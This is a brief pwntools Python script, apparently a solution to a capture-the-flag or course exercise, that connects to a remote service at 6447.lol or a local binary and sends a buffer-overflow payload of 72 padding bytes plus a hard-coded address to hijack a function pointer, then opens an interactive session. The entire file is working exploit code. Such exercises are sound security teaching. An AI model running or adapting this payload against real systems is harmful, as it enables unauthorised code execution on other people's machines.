from pwn import *
def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    prompt = p.recvuntil(b'Do you remember how function pointers work ?').decode('utf-8').strip()
    payload = "A"*72 + "\xd6\x11\x40\x00\x00\x00\x00\x00"
    p.sendline(str(payload))
    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 24224)
# interact_with_process('../w1/too-slow')
